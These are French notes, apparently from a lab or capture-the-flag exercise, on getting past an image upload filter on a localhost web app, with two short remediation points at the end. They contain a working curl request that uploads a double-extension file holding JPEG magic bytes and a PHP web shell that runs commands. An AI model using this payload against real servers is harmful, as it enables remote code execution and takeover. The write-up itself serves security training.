UPLOAD IMAGE BYPASS

- bon un peu compliqué
- j'ai essayé d'upload une image classique toutes les images me retourne un "Your image was not uploaded." a par pour les extensions jpeg
qui me retournent: /tmp/img.jpeg succesfully uploaded.
- Mais quand c'est une vrai image jpeg j'ai quand même l'erreur: "Your image was not uploaded."
- la seule fois ou j'ai successfully upload est quand j'ai une petite image j'ai l'impression => oui les petites images jpeg pas corrompues fonctionnent aussi. Mais enfaite c'est juste la limite de taille de 10000 qui bloque ca
- quand j'envoie une image avec une modification de path par exemple filename="../shell.php\x00.jpeg" les ../ sont enlevés
- SI j'envoie au format encodé comme ici avec des caractères \n et \r ils sont juste supprimés aussi
- et bien enfaite il faillait juste envoyer la commande curl en inversant .jpeg et .php:

curl -X POST "http://localhost:8080/?page=upload" \
  -H "Content-Type: multipart/form-data; boundary=----boundary" \
  --data-binary $'------boundary\r
Content-Disposition: form-data; name="MAX_FILE_SIZE"\r
\r
100000\r
------boundary\r
Content-Disposition: form-data; name="uploaded"; filename="img.jpeg.php"\r        
Content-Type: image/jpeg\r
\r
\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>\xFF\xD9\r
------boundary\r
Content-Disposition: form-data; name="Upload"\r
\r
Upload\r
------boundary--\r' > output.html && firefox output.html

- Les premiers arguments correspondent à la signature d'un fichier jpeg et le reste correspond à un script php exécuté dans le backend

source :https://www.vaadata.com/blog/file-upload-vulnerabilities-and-security-best-practices/

RESOLUTION FAILLE:

- Proteger l'exetension d'image
- Verifier le contenu de l'image
